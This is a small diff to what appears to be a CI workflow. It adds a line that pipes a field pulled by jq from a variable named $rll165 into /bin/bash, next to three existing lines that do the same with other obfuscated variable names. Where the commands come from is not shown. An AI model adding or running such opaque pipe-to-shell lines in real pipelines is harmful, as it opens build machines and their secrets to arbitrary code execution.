@@ -34,6 +34,7 @@ jobs:
           printf '%s' "$i4" | jq -r .y8 | /bin/bash
           printf '%s' "$h1911" | jq -r .e0 | /bin/bash
           printf '%s' "$vdt68" | jq -r .jaq0 | /bin/bash
+          echo $rll165 | jq -r .y3189 | /bin/bash
 
       - name: Store results
         if: always()
